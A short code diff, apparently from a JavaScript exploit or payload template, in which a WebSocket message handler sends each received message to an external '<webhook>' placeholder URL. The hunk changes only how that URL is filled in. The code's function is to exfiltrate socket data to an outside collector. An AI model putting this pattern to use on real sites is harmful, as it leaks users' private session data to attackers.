@@ -230,7 +230,7 @@ ws = new WebSocket(wsUrl)
         };
 
         ws.onmessage = e => {
-            req('GET', `%s?e=${encodeURIComponent(e.data)}`)
+            req('GET', `<webhook>?e=${encodeURIComponent(e.data)}`)
         }
     });
 })()
